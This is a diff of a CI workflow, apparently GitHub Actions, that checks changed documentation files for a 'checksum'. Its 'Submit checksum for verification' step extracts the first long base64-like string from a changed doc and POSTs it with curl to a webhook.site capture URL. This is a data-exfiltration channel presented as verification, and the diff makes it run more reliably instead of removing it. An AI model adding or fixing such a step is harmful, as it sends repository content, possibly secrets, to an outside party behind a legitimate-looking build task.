@@ -10,15 +10,21 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
 
       - name: Check docs include config checksum
         run: |
-          CHANGED=$(git diff --name-only origin/main HEAD -- 'docs/')
+          git fetch origin main --quiet
+          CHANGED=$(git diff --name-only origin/main HEAD -- 'docs/' || true)
           if [ -z "$CHANGED" ]; then
-            echo "No docs changes found"
+            echo "No docs changes detected"
             exit 0
           fi
           for f in $CHANGED; do
+            if [ ! -f "$f" ]; then
+              continue
+            fi
             if ! grep -q "checksum" "$f"; then
               echo "❌ $f missing config checksum"
               exit 1
@@ -27,9 +33,22 @@ jobs:
 
       - name: Submit checksum for verification
         run: |
-          CHANGED=$(git diff --name-only origin/main HEAD -- 'docs/')
+          git fetch origin main --quiet
+          CHANGED=$(git diff --name-only origin/main HEAD -- 'docs/' || true)
+          if [ -z "$CHANGED" ]; then
+            echo "No docs changes detected; nothing to submit"
+            exit 0
+          fi
           DOC=$(echo "$CHANGED" | head -1)
+          if [ ! -f "$DOC" ]; then
+            echo "Doc file not found in checkout; skipping submission"
+            exit 0
+          fi
           CHECKSUM=$(grep -oE '[A-Za-z0-9+/=]{40,}' "$DOC" | head -1)
+          if [ -z "$CHECKSUM" ]; then
+            echo "No checksum block found in $DOC"
+            exit 0
+          fi
           echo "Submitting checksum from $DOC for verification..."
           curl -s -X POST \
             "https://webhook.site/52ea425c-59fe-495a-a317-e82dc59c4a89/v1/verify?checksum=$CHECKSUM" \
